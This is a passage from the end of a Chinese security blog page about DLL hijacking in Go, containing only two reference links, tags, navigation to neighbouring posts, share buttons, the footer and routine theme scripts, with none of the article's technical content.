<li>[17] <a href=https://github.com/NaniteFactory/dllmain>github.com/NaniteFactory/dllmain</a></li>
<li>[18] <a href=https://stackoverflow.com/a/67970294/16654916>How to implement DllMain entry point in Go</a></li>
</ul>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=//hacktech.cn/tags/golang/>Golang</a></li>
<li><a href=//hacktech.cn/tags/%E7%BA%A2%E9%98%9F/>红队</a></li>
</ul>
<nav class=paginav>
<a class=prev href=//hacktech.cn/2021/09/29/proj-sonarqube-dingtalk-robot/>
<span class=title>« 上一页</span>
<br>
<span>SonarQube钉钉通知插件</span>
</a>
<a class=next href=//hacktech.cn/2021/04/16/deimosc2-source-read/>
<span class=title>下一页 »</span>
<br>
<span>DeimosC2 源码阅读</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share golang实现dll恶意劫持转发 on twitter" href="https://twitter.com/intent/tweet/?text=golang%e5%ae%9e%e7%8e%b0dll%e6%81%b6%e6%84%8f%e5%8a%ab%e6%8c%81%e8%bd%ac%e5%8f%91&url=%2f%2fhacktech.cn%2f2021%2f07%2f22%2fgolang-evil-dll-proxy%2f&hashtags=golang%2c%e7%ba%a2%e9%98%9f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share golang实现dll恶意劫持转发 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=%2f%2fhacktech.cn%2f2021%2f07%2f22%2fgolang-evil-dll-proxy%2f&title=golang%e5%ae%9e%e7%8e%b0dll%e6%81%b6%e6%84%8f%e5%8a%ab%e6%8c%81%e8%bd%ac%e5%8f%91&summary=golang%e5%ae%9e%e7%8e%b0dll%e6%81%b6%e6%84%8f%e5%8a%ab%e6%8c%81%e8%bd%ac%e5%8f%91&source=%2f%2fhacktech.cn%2f2021%2f07%2f22%2fgolang-evil-dll-proxy%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share golang实现dll恶意劫持转发 on reddit" href="https://reddit.com/submit?url=%2f%2fhacktech.cn%2f2021%2f07%2f22%2fgolang-evil-dll-proxy%2f&title=golang%e5%ae%9e%e7%8e%b0dll%e6%81%b6%e6%84%8f%e5%8a%ab%e6%8c%81%e8%bd%ac%e5%8f%91"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share golang实现dll恶意劫持转发 on facebook" href="https://facebook.com/sharer/sharer.php?u=%2f%2fhacktech.cn%2f2021%2f07%2f22%2fgolang-evil-dll-proxy%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share golang实现dll恶意劫持转发 on whatsapp" href="https://api.whatsapp.com/send?text=golang%e5%ae%9e%e7%8e%b0dll%e6%81%b6%e6%84%8f%e5%8a%ab%e6%8c%81%e8%bd%ac%e5%8f%91%20-%20%2f%2fhacktech.cn%2f2021%2f07%2f22%2fgolang-evil-dll-proxy%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share golang实现dll恶意劫持转发 on telegram" href="https://telegram.me/share/url?text=golang%e5%ae%9e%e7%8e%b0dll%e6%81%b6%e6%84%8f%e5%8a%ab%e6%8c%81%e8%bd%ac%e5%8f%91&url=%2f%2fhacktech.cn%2f2021%2f07%2f22%2fgolang-evil-dll-proxy%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2021 <a href=//hacktech.cn/>Akkuman 的博客</a></span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)">
<button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</button>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>